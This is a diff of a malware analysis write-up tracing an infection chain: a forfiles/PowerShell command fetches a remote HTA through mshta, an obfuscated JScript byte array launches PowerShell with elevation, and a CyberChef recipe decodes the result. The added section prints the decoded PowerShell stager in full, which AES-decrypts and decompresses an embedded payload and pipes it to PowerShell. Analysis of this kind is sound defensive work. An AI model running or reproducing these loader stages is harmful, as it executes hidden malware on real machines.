@@ -15,6 +15,8 @@ C:\Windows\System32\forfiles.exe /p C:\Windows\Vss /c "powershell start mshta ht
 
 A file is being downloaded and executed against mshta, meaning the payload is likely a HTA file (Microsoft HTML Application)
 
+## HTA File
+
 The [file](https://www.virustotal.com/gui/file/302ec5af12ccc15b5771b3ed2b951ddc708f757c2103a1d6e71790f03902025e/detection) seems to contain a lot of junk characters at the start, it then has script tags which mshta will read and execute, followed by an MZ header for the legitimate calc.exe binary, likely added as a defence evasion technique.
 
 **Initial Bytes:**
@@ -77,5 +79,33 @@ function OlC(OES){var mvQ= "";for (var UpM = 0; UpM < OES.length; UpM++) {var Ax
 10,557,564,555,559,554,546,557,540,555,547,564,489,510,548,555,547,544,557,520,554,543,544,536,501,501,512,510,509,502,479,557,559,541,557,526,563,526,489,523,540,543,543,548,553,546,475,504,475,534,526,564,558,559,544,552,489,526,544,542,560,557,548,559,564,489,510,557,564,555,559,554,546,557,540,555,547,564,489,523,540,543,543,548,553,546,520,554,543,544,536,501,501,533,544,557,554,558,502,479,557,559,541,557,526,563,526,489,509,551,554,542,550,526,548,565,544,475,504,475,492,493,499,502,479,557,559,541,557,526,563,526,489,518,544,564,526,548,565,544,475,504,475,493,496,497,502,479,557,559,541,557,526,563,526,489,518,544,564,475,504,475,534,526,564,558,559,544,552,489,510,554,553,561,544,557,559,536,501,501,513,557,554,552,509,540,558,544,497,495,526,559,557,548,553,546,483,479,523,530,513,540,508,484,502,479,549,516,531,508,564,475,504,475,534,526,564,558,559,544,552,489,510,554,553,561,544,557,559,536,501,501,513,557,554,552,509,540,558,544,497,495,526,559,557,548,553,546,483,479,563,525,553,557,559,551,484,502,479,557,526,555,531,530,554,549,559,475,504,475,479,549,516,531,508,564,534,491,489,489,492,496,536,502,479,557,559,541,557,526,563,526,489,516,529,475,504,475,479,557,526,555,531,530,554,549,559,502,479,552,531,554,554,511,519,549,549,562,475,504,475,479,557,559,541,557,526,563,526,489,510,557,544,540,559,544,511,544,542,557,564,555,559,554,557,483,484,502,479,518,515,553,565,550,541,546,531,524,475,504,475,479,552,531,554,554,511,519,549,549,562,489,527,557,540,553,558,545,554,557,552,513,548,553,540,551,509,551,554,542,550,483,479,549,516,531,508,564,487,
 475,492,497,487,475,479,549,516,531,508,564,489,519,544,553,546,559,547,475,488,475,492,497,484,502,479,557,559,541,557,526,563,526,489,511,548,558,555,554,558,544,483,484,502,479,548,516,540,560,564,475,504,475,521,544,562,488,522,541,549,544,542,559,475,526,564,558,559,544,552,489,516,522,489,520,544,552,554,557,564,526,559,557,544,540,552,483,475,487,475,479,518,515,553,565,550,541,546,531,524,475,484,502,479,516,565,564,557,547,475,504,475,521,544,562,488,522,541,549,544,542,559,475,526,564,558,559,544,552,489,516,522,489,520,544,552,554,557,564,526,559,557,544,540,552,502,479,559,547,542,525,525,532,552,556,546,475,504,475,521,544,562,488,522,541,549,544,542,559,475,526,564,558,559,544,552,489,516,522,489,510,554,552,555,557,544,558,558,548,554,553,489,514,565,548,555,526,559,557,544,540,552,475,479,548,516,540,560,564,487,475,483,534,516,522,489,510,554,552,555,557,544,558,558,548,554,553,489,510,554,552,555,557,544,558,558,548,554,553,520,554,543,544,536,501,501,511,544,542,554,552,555,557,544,558,558,484,502,479,559,547,542,525,525,532,552,556,546,489,510,554,555,564,527,554,483,475,479,516,565,564,557,547,475,484,502,479,559,547,542,525,525,532,552,556,546,489,510,551,554,558,544,483,484,502,479,548,516,540,560,564,489,510,551,554,558,544,483,484,502,534,541,564,559,544,534,536,536,475,479,524,530,554,516,518,545,547,475,504,475,479,516,565,564,557,547,489,527,554,508,557,557,540,564,483,484,502,479,518,518,526,515,557,517,508,513,475,504,475,534,526,564,558,559,544,552,489,527,544,563,559,489,512,553,542,554,543,548,553,546,536,501,501,528,527,513,499,489,514
 ,544,559,526,559,557,548,553,546,483,479,524,530,554,516,518,545,547,484,502,479,518,518,526,515,557,517,508,513,475,567,475,555,554,562,544,557,558,547,544,551,551,475,4880);var xce = OlC(e526,547,544,551,551,489,508,555,555,551,548,542,540,559,548,554,5530);var qG6 = new ActiveXObject(xce);qG6.ShellExecute('powershell.exe', Srv, null, "runas", 1)
+```
+## PowerShell Stage
+
+This script is essentially executing a byte array with PowerShell, but the values of the byte array are being manipulated first, each byte has the value 443 subtracted from it before execution.
+
+We can tackle this by taking the byte array in CyberChef and using the following operators:
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/82a85cd1-e68f-4393-a57f-ccf3f6d0754d)
+
+We first create a Fork with a comma delimiter, this will apply all future operations separately where a comma divides the decimals.
+
+We then add a find / replace operator, we replace each value with itself and 443
+
+For some reason, this creates two 443 values after each decimal, but rather than figuring out why, I just find / replace the two values with one.
+
+Then, add a subtract operator with a space delimiter.
+
+Convert the decimals from decimals, merge, and remove whitespace, to reveal the following:
+
+```powershell
+-w1-epUnrestricted-
+nop$xRnrtl='AAAAAAAAAAAAAAAAAAAAAD0Af5kmiW2Hnx1ert6ZiHkcrCG5xRw5g+RXkvjSvgaUbk+srbVrOsQgn8toO+hu0Qw1KQj7FAk5xMoqfeLJjMEeamlWrF3FTQ6in6FDMU0esWs41x91rJ/vkrJQOkHUMM2MmLD03n+lBrw2YeIcINOqvu4GIVPjd+Fis/QpUW5Fj8iNCDQy7bTeb/cl1K0KC1ocqAlvj83iKlmuvdzxPum6cIQxLt+2YLh6fmAQocUETi+pQw294/BrcWHiPbCLQ3IVN1QFO/QcDcgmCGGhLZSmlSKvXW
+S4pkFTnsaeCv0q8qpFQPIbBpzGkWGBKxMJYhQh81lXHyPxeOeFyFq6jqW2vUm+uqMCwX1N5g5UHXYw3Qg4zpyOCq0I5EwoDqzACg0FQ7NLbZAuwhTLK+Yu1JUpq7a86i+FRnVjkA9yOJMjUROJtiOoDNfMdo0ej8BzSKoid4bytekfnZGfb1xfEAyrNCki102wWcJK/vZZFJJQ0EWOmR4qPclxZ3kj3QXa7iwBBn/xEMGg8xE8RDWaHfXHZqdxlpnoKmQX6CchYBPK5Q/alHBAM5gOIN5RcmnQecgz+itBcGKRKac4QUIuYCsTNOGF
+Gvc0/93UPNG9W8OrCD+b24Y2bZP/KolyWolNdjJRHwp4RJAA9iJshbpdMe4n95z2TmNVPEVN28sDZ0kfiJCKpkbu1TkpQNSnY46SLTiZTT3ajO8Sox/hCnztghhj4DMhfQfHJBcMyZ1yynlBM+7lNgUyvioQxQ2KPY7KDi7JTpk1iQYGc+oBvO/fWUMtz9kzyEyxJpOGkwI3MMjDpUYIc9iprfEHj8hpwVdPjhcenIyhZqn28939MlitHffq24shDMzCPgjnU9OWPsMhEKvfu34pU/yjbMkwLHEjcQ==';$PWFaA='d0hDTktlemN0
+SlFHRXFla0Rjb094cnRoUGlSR050VmI=';$rtbrSxS=New-Object'System.Security.Cryptography.AesManaged';$rtbrSxS.Mode=[System.Security.Cryptography.CipherMode]::ECB;$rtbrSxS.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;$rtbrSxS.BlockSize=128;$rtbrSxS.KeySize=256;$rtbrSxS.Key=
+[System.Convert]::FromBase64String($PWFaA);$jIXAy=[System.Convert]::FromBase64String($xRnrtl);$rSpXWojt=$jIXAy[0..15];$rtbrSxS.IV=$rSpXWojt;$mXooDLjjw=$rtbrSxS.CreateDecryptor();$KHnzkbgXQ=$mXooDLjjw.TransformFinalBlock($jIXAy,16,$jIXAy.Length-16);$rtbrSxS.Dispose();$iIauy=New-
+ObjectSystem.IO.MemoryStream(,$KHnzkbgXQ);$Izyrh=New-ObjectSystem.IO.MemoryStream;$thcRRYmqg=New-ObjectSystem.IO.Compression.GzipStream$iIauy,([IO.Compression.CompressionMode]::Decompress);$thcRRYmqg.CopyTo($Izyrh);$thcRRYmqg.Close();$iIauy.Close();[byte[]]$QWoIKfh=$Izyrh.ToArray();$KKSHrJAF=
+[System.Text.Encoding]::UTF8.GetString($QWoIKfh);$KKSHrJAF|powershell
 ```
 
